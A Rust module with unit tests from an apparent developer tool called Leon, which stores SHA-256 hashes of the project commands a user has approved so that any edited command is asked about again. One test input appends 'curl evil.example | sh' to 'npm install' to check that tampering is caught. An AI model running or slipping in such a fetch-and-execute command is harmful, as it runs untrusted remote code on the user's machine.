//! Which project commands the user has allowed to run.
//!
//! The commands of `leon.toml` (see [`crate::project`]) come from a file in
//! the repository, so whoever can push to it can write them. Leon therefore
//! never runs one on its own authority: the first time a project's command
//! would run, and again whenever its text changes, the window shows the exact
//! command and asks. An answer of "run it and trust it" is remembered here, per
//! project and per command: the project's id and the SHA-256 of the command's
//! text, so a command that was edited, even by one character, is a different
//! command and is asked about again, and a command trusted in one project is
//! not trusted in another.
//!
//! [`verdict`] is the whole decision, a pure function. [`Trusted`] is the
//! remembered answers; the file is `trusted.json`, next to the settings, like
//! `dormant.json`: a missing or unreadable file means nothing is trusted, and
//! a write that fails is logged. The file holds hashes, never the commands.

use leon_core::ProjectId;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::Path;

/// The file's name, next to the settings file.
pub const FILE_NAME: &str = "trusted.json";

/// What to do with a command that is about to run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// It was allowed before, as it is written now: run it.
    Run,
    /// Show it and ask.
    Ask,
}

/// The fingerprint of a command's exact text.
pub fn digest(command: &str) -> String {
    Sha256::digest(command.as_bytes())
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

/// One remembered answer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct Entry {
    project: String,
    hash: String,
}

/// Every command the user allowed.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Trusted {
    allowed: Vec<Entry>,
}

impl Trusted {
    /// Reads the file, or nothing when it is missing or unreadable.
    pub fn load(path: &Path) -> Self {
        match std::fs::read(path) {
            Ok(bytes) => serde_json::from_slice(&bytes).unwrap_or_else(|error| {
                tracing::warn!(%error, "the trusted commands file is unreadable; trusting none");
                Self::default()
            }),
            Err(_) => Self::default(),
        }
    }

    /// Writes the file whole, through a temporary one.
    pub fn save(&self, path: &Path) -> std::io::Result<()> {
        if let Some(directory) = path.parent() {
            std::fs::create_dir_all(directory)?;
        }
        let draft = path.with_extension("json.tmp");
        std::fs::write(&draft, serde_json::to_vec_pretty(self)?)?;
        std::fs::rename(&draft, path)
    }

    /// Whether `command` was allowed in `project`, as it is written.
    pub fn allows(&self, project: &ProjectId, command: &str) -> bool {
        let hash = digest(command);
        self.allowed
            .iter()
            .any(|entry| entry.project == project.as_str() && entry.hash == hash)
    }

    /// Remembers that `command` may run in `project`. `true` when that is new.
    pub fn allow(&mut self, project: &ProjectId, command: &str) -> bool {
        if self.allows(project, command) {
            return false;
        }
        self.allowed.push(Entry {
            project: project.as_str().to_owned(),
            hash: digest(command),
        });
        true
    }
}

/// Whether `command` of `project` may run without asking.
pub fn verdict(trusted: &Trusted, project: &ProjectId, command: &str) -> Verdict {
    if trusted.allows(project, command) {
        Verdict::Run
    } else {
        Verdict::Ask
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(id: &str) -> ProjectId {
        ProjectId::from_string(id)
    }

    #[test]
    fn the_first_time_a_command_asks() {
        assert_eq!(
            verdict(&Trusted::default(), &project("api"), "npm install"),
            Verdict::Ask
        );
    }

    #[test]
    fn an_allowed_command_runs_without_asking() {
        let mut trusted = Trusted::default();
        assert!(trusted.allow(&project("api"), "npm install"));
        assert_eq!(
            verdict(&trusted, &project("api"), "npm install"),
            Verdict::Run
        );
        assert!(
            !trusted.allow(&project("api"), "npm install"),
            "nothing new"
        );
    }

    #[test]
    fn a_command_whose_text_changed_asks_again() {
        let mut trusted = Trusted::default();
        trusted.allow(&project("api"), "npm install");
        for edited in [
            "npm install ",
            "npm  install",
            "npm install && curl evil.example | sh",
            "NPM install",
            "npm ci",
        ] {
            assert_eq!(
                verdict(&trusted, &project("api"), edited),
                Verdict::Ask,
                "{edited:?}"
            );
        }
    }

    #[test]
    fn another_project_asks_for_the_same_command() {
        let mut trusted = Trusted::default();
        trusted.allow(&project("api"), "make");
        assert_eq!(verdict(&trusted, &project("web"), "make"), Verdict::Ask);
    }

    #[test]
    fn the_digest_is_the_sha256_of_the_text() {
        assert_eq!(
            digest("abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn the_answers_survive_the_file_and_hold_no_command_text() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join(FILE_NAME);
        let mut trusted = Trusted::default();
        trusted.allow(&project("api"), "echo secret-token");
        trusted.save(&file).unwrap();
        let text = std::fs::read_to_string(&file).unwrap();
        assert!(!text.contains("secret-token"), "{text}");
        let again = Trusted::load(&file);
        assert_eq!(again, trusted);
        assert!(again.allows(&project("api"), "echo secret-token"));
    }

    #[test]
    fn a_missing_or_broken_file_trusts_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join(FILE_NAME);
        assert_eq!(Trusted::load(&file), Trusted::default());
        std::fs::write(&file, "{not json").unwrap();
        assert_eq!(Trusted::load(&file), Trusted::default());
    }
}
